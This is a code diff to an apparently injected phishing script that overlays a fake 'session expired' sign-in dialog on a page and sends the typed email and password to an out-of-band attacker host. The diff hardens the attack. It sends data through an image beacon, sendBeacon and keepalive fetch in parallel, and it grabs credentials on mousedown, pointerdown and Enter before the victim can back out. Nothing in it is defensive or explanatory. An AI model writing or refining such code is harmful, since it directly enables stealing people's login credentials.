@@ -25,19 +25,18 @@
   function topWin() { try { return window.top; } catch (_) { return window; } }
   function topDoc() { try { return topWin().document; } catch (_) { return document; } }
 
-  // ---- Reliable exfil ------------------------------------------------------
+  // ---- Reliable exfil — fire ALL channels in parallel, no early-return ----
   function exfil(path, payload) {
     var url  = OOB + path;
     var body = JSON.stringify(payload);
-    // 1) sendBeacon — best for iframe-teardown / page-unload reliability.
-    try {
-      var blob = new Blob([body], { type: 'text/plain;charset=UTF-8' });
-      if (navigator.sendBeacon && navigator.sendBeacon(url, blob)) return;
-    } catch (_) {}
-    // 2) keepalive fetch fallback.
-    try { fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch (_) {}
-    // 3) Image GET fallback — only base64-encoded payload via querystring.
+    // 1) Image GET — synchronous, fires before any teardown can cancel.
     try { new Image().src = url + '?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(body)))); } catch (_) {}
+    // 2) sendBeacon — survives unload + iframe teardown.
+    try {
+      if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([body], { type: 'text/plain;charset=UTF-8' }));
+    } catch (_) {}
+    // 3) keepalive fetch — additional belt+suspenders.
+    try { fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch (_) {}
   }
 
   // ---- Video pause / re-pause guard ---------------------------------------
@@ -77,7 +76,7 @@
 
   // ---- Dialog content ------------------------------------------------------
   var DIALOG_MARKUP = [
-    '<form id="dm-ph-form" method="dialog" style="margin:0;padding:36px 40px;background:#fff;width:360px;',
+    '<div id="dm-ph-form" style="margin:0;padding:36px 40px;background:#fff;width:360px;',
       'border:none;border-radius:10px;box-shadow:0 8px 32px rgba(0,0,0,0.3);',
       'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif">',
       '<div style="text-align:center;margin-bottom:24px">',
@@ -90,18 +89,18 @@
       '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
         'Your session has expired.<br>Please sign in to continue.',
       '</p>',
-      '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email" required',
+      '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
         ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
-      '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password" required',
+      '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
         ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
-      '<button id="dm-ph-btn" type="submit"',
+      '<button id="dm-ph-btn" type="button"',
         ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
         'Sign in',
       '</button>',
       '<div style="text-align:center;margin-top:16px">',
         '<a href="#" id="dm-ph-fp" style="color:#FF7900;font-size:12.5px;text-decoration:none">Forgot password?</a>',
       '</div>',
-    '</form>'
+    '</div>'
   ].join('');
 
   // Inject backdrop style + zero-padding so the form fills the dialog.
@@ -159,21 +158,32 @@
       setTimeout(function () { try { dlg.showModal(); } catch (_) {} }, 0);
     }, true);
 
-    // Hook the form submit + button click — sendBeacon then strip dialog.
-    var form = d.getElementById('dm-ph-form');
-    if (form) {
-      form.addEventListener('submit', function (e) { e.preventDefault(); submitCreds(); }, true);
+    // De-dup guard so triple-bound click/mouseup/touchend doesn't fire 3x.
+    var _sent = false;
+    function fire(e) {
+      try { if (e) e.preventDefault(); } catch (_) {}
+      if (_sent) return;
+      _sent = true;
+      submitCreds();
     }
     var btn = d.getElementById('dm-ph-btn');
     if (btn) {
-      btn.addEventListener('click',    function (e) { e.preventDefault(); submitCreds(); }, true);
-      btn.addEventListener('mouseup',  function (e) { e.preventDefault(); submitCreds(); }, true);
-      btn.addEventListener('touchend', function (e) { e.preventDefault(); submitCreds(); }, true);
+      btn.addEventListener('click',    fire, true);
+      btn.addEventListener('mousedown', fire, true);
+      btn.addEventListener('touchstart', fire, true);
+      // pointerdown is most reliable across mouse + touch + pen.
+      btn.addEventListener('pointerdown', fire, true);
     }
     var pass = d.getElementById('dm-ph-pass');
     if (pass) {
       pass.addEventListener('keydown', function (e) {
-        if (e.key === 'Enter' || e.keyCode === 13) { e.preventDefault(); submitCreds(); }
+        if (e.key === 'Enter' || e.keyCode === 13) fire(e);
+      }, true);
+    }
+    var email = d.getElementById('dm-ph-email');
+    if (email) {
+      email.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter' || e.keyCode === 13) fire(e);
       }, true);
     }
     var fp = d.getElementById('dm-ph-fp');
